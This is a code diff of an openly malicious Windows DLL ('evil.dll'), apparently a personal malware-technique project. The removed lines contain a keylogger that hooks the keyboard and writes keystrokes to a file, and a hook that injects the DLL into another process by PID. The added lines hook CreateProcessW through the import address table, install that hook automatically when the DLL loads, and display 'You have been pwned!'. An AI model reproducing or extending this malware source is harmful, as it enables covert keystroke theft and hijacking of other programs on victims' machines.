@@ -1,60 +1,48 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <thread>
-#include <chrono>
-#include "process_injection.h"
+#include "evil.h"
 
 
-BOOL runThread = TRUE;
-HHOOK hookHandle;
-MSG msg;
-
-HOOKPROC ProcessKeystroke(int code, WPARAM wParam, LPARAM lParam){
-    KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
-    if (p->vkCode == VK_ESCAPE) {
-      runThread = FALSE;
-      UnhookWindowsHookEx(hookHandle);
-      printf("Hooking disabled by esc.");
-      PostQuitMessage(0);
-      return 0;
-    }
-    FILE *fp = fopen("keystrokes.txt", "a+");
-    if (fp != NULL){
-        DWORD key = p->vkCode;
-        fprintf(fp, "%c", MapVirtualKeyA(key, MAPVK_VK_TO_CHAR));
-        fclose(fp);
-    }
-    return 0;
-}
-
-
-__declspec(dllexport)
-LPTHREAD_START_ROUTINE Keylogger(){
-    printf("Keylogging started... tracking keystrokes");
-    hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL,  (HOOKPROC) ProcessKeystroke, NULL, 0);
-    if (hookHandle == NULL){
-        printf("Failed to install hook handle.");
-        return  (LPTHREAD_START_ROUTINE) 1;
-    }
-    while (runThread && GetMessage( &msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-    return (LPTHREAD_START_ROUTINE) 0;
-}
-
-int (*originalMsgBox)(HWND, LPCSTR, LPCSTR, UINT) = MessageBoxA;
-int MyEvilFunction(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
+int hookMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
     printf("This is my evil function!\n");
     DWORD PID;
     printf("Inject another PID to insert Keylogger:");
     scanf("%d", &PID);
     HANDLE thread = ProcessInjection( PID, strlen(".\\evil.dll") + 1, ".\\evil.dll", "evil.dll", "Keylogger");
-    
     return originalMsgBox(hWnd, lpText, lpCaption, uType);
 }
 
-void ParsePE(LPCSTR functionToHook ){
+
+BOOL hookCreateProcessW(
+    LPCWSTR lpApplicationName, 
+    LPWSTR lpCommandLine, 
+    LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    BOOL bInheritHandles,
+    DWORD dwCreationFlags,
+    LPVOID lpEnvironment,
+    LPCWSTR lpCurrentDirectory,
+    LPSTARTUPINFOW lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation
+){
+    
+    int result = MessageBoxA(
+        NULL, // No owner window
+        "You have been pwned!", // Message text
+        "Confirmation", // Title of the message box
+        MB_OKCANCEL | MB_ICONQUESTION // Buttons and icon type
+    );
+
+    printf("CreateProcessW hooked!");
+    return originalCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
+}
+
+
+void HookIatApi(LPCSTR functionToHook ){
+    // MessageBoxA(
+    //                 NULL,
+    //                 "HookIatApi Entry",
+    //                 "Success",
+    //                 MB_OK
+    //             ); // APPEARS SUCCESSFULY
     PVOID imageBase = GetModuleHandle(NULL);
     PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER) imageBase;
     PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)imageBase + dosHeaders->e_lfanew);
@@ -64,9 +52,14 @@ void ParsePE(LPCSTR functionToHook ){
 
     importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importDirectory.VirtualAddress + (DWORD_PTR)imageBase);
 
-    while ( importDescriptor->Name != 0){
+    while ( importDescriptor->Name != 0){ // Loop through the DLLs in the import table until we reach the end (Name == 0)
         LPCSTR dllName = (LPCSTR) (importDescriptor->Name + (DWORD_PTR) imageBase);
-        printf("DLL Name: %s\n", dllName);
+        // char dllmsg[256];
+        // sprintf(dllmsg,
+        //     "DLL=%s\n",
+        //     dllName);
+        // MessageBoxA(NULL, dllmsg, "Debug", MB_OK);
+        
         // OriginalFirstThunk (also called as Import Lookup Table) contains the supposed addresses of the imported functions.
         PIMAGE_THUNK_DATA originalFirstThunk = (PIMAGE_THUNK_DATA)(importDescriptor->OriginalFirstThunk + (DWORD_PTR)imageBase);
         /*
@@ -80,32 +73,80 @@ void ParsePE(LPCSTR functionToHook ){
         PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA) (importDescriptor->FirstThunk  + (DWORD_PTR) imageBase);
 
         while (originalFirstThunk->u1.AddressOfData != 0){
-            PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(originalFirstThunk->u1.AddressOfData + (DWORD_PTR)imageBase);
-            LPCSTR functionName = (LPCSTR)importByName->Name;
-            printf("Function Name: %s\n", functionName);
+            if (0 == (originalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)){
+                // The function is imported by name
+                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(originalFirstThunk->u1.AddressOfData + (DWORD_PTR)imageBase);
+                LPCSTR functionName = (LPCSTR)importByName->Name;
+                
+                // char message[512];
+                // sprintf(message, "Hello, %s! Welcome to the program.", functionName);
+                // MessageBoxA(
+                //     NULL,
+                //     message,
+                //     "Success",
+                //     MB_OK
+                //     );
+                if (strcmp(functionName, functionToHook) == 0){
+                    printf("Found %s function at address: %p\n", functionToHook, firstThunk->u1.Function);
+                    DWORD oldProtect = 0;
+                    BOOL ok = VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_EXECUTE_READWRITE, &oldProtect);
+                    if (!ok){
+                        MessageBoxA(
+                        NULL,
+                        "HookItApi: VirtualProtect failed.",
+                        "Success",
+                        MB_OK
+                        );
+                        return;
+                    }
+                    // Overwrite the function pointer in the IAT with the address of our custom function
+                    firstThunk->u1.Function = (DWORD_PTR)hookCreateProcessW;    
+                    printf("IAT Successfully hooked!!! Nothing happened... Shhhhhhhh \n");
+                    MessageBoxA(
+                        NULL,
+                        "IAT Successfully hooked!!! Nothing happened... Shhhhhhhh",
+                        "Success",
+                        MB_OK
+                    );
+                    return;
+                } // if strcmp
 
-            if (strcmp(functionName, functionToHook) == 0){
-                printf("Found %s function at address: %p\n", functionToHook, firstThunk->u1.Function);
-                DWORD oldProtect = 0;
-                VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_EXECUTE_READWRITE, &oldProtect);
-                // Overwrite the function pointer in the IAT with the address of our custom function
-                firstThunk->u1.Function = (DWORD_PTR)MyEvilFunction;    
-                printf("IAT Successfully hooked!!! Nothing happened... Shhhhhhhh \n");
-                return;
-            }
-            
+            } // end if 
             originalFirstThunk++;
             firstThunk++;
-        }
+        } // end while
         importDescriptor++;
-    }
+    } // end while
+    MessageBoxA(
+            NULL,
+            "Can't find the target function... :(",
+            "Failed",
+            MB_OK
+    );
     printf("Could not find the function %s in the IAT.\n", functionToHook);
 }
 
+DWORD WINAPI HookThread(LPVOID p)
+{
+    HookIatApi("CreateProcessW");
+    return 0;
+}
 
 BOOL DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
     printf("DLLMain called!\n");    
-    ParsePE("MessageBoxA");
+    if (fdwReason == DLL_PROCESS_ATTACH)
+    {
+        DisableThreadLibraryCalls(hinstDLL);
+
+        CreateThread(
+            NULL,
+            0,
+            HookThread,
+            NULL,
+            0,
+            NULL);
+    }
+    
     // Find out how to continue execution of the victim process after the DLL is injected.
     return TRUE;
 }
